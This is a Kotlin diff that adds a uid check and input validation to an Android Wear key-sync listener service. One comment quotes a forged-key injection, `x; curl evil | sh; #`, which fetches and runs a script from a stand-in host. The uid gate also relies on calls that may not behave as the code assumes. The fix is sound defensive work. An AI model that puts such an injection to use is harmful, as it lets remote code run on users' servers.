@@ -101,22 +101,41 @@ object WatchKeySync {
  */
 class WatchKeySyncListenerService : com.google.android.gms.wearable.WearableListenerService() {
     override fun onDataChanged(events: DataEventBuffer) {
+        // Security (adversarial review Oct 8): this service is exported so
+        // Google Play services can deliver wear data events — but "exported"
+        // also lets ANY app bind it directly and forge onDataChanged without
+        // the Wear stack. Two gates close that:
+        //  (1) validate received values at THIS sink (the sender-side regex
+        //      in MainActivity guarded only the typed-input path; a forged
+        //      key like `x; curl evil | sh; #` previously saved cleanly and
+        //      executed at every server start via the launch script);
+        //  (2) reject binds whose calling uid is not Google Play services.
+        val gmsUid = packageManager.getPackageUid("com.google.android.gms", 0)
+        val binderUid = android.os.Binder.getCallingUid()
+        if (gmsUid != -1 && binderUid != gmsUid && binderUid != android.os.Process.myUid()) {
+            Log.w(WatchKeySync.TAG, "key-sync bind rejected: uid $binderUid is not GMS")
+            return
+        }
         events.forEach { ev ->
             if (ev.type != DataEvent.TYPE_CHANGED) return@forEach
             val item = ev.dataItem
             if (!item.uri.path.orEmpty().startsWith(WatchKeySync.KEY_PATH)) return@forEach
             val map = DataMapItem.fromDataItem(item).dataMap
-            val key = map.getString(WatchKeySync.KEY_FIELD).orEmpty().trim()
-            val env = map.getString(WatchKeySync.ENV_FIELD).orEmpty().trim()
-            if (key.isNotEmpty()) {
+            val key = LettaEnvironmentService.validatedKey(map.getString(WatchKeySync.KEY_FIELD)) ?: run {
+                Log.w(WatchKeySync.TAG, "key-sync payload failed key-shape validation — discarded")
+                return@forEach
+            }
+            val env = LettaEnvironmentService.validatedEnv(map.getString(WatchKeySync.ENV_FIELD))
+                ?: LettaEnvironmentService.DEFAULT_ENV
+            {
                 val prefs = getSharedPreferences(
                     LettaEnvironmentService.PREFS, Context.MODE_PRIVATE
                 )
                 prefs.edit()
                     .putString(LettaEnvironmentService.PREF_KEY, key)
-                    .putString(LettaEnvironmentService.PREF_ENV, env.ifEmpty { LettaEnvironmentService.DEFAULT_ENV })
+                    .putString(LettaEnvironmentService.PREF_ENV, env)
                     .apply()
-                Log.i(WatchKeySync.TAG, "key received from phone (env=${env.ifEmpty { "default" }})")
+                Log.i(WatchKeySync.TAG, "key received from phone (env=$env)")
                 WatchKeySync.notifyKeyDelivered()
                 // If the app is sitting in onboarding (fresh install flow the
                 // key sync is meant to skip), bring it forward so the user
@@ -124,7 +143,7 @@ class WatchKeySyncListenerService : com.google.android.gms.wearable.WearableList
                 val launch = packageManager.getLaunchIntentForPackage(packageName)
                 launch?.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                 startActivity(launch)
-            }
+            }()
         }
     }
 }
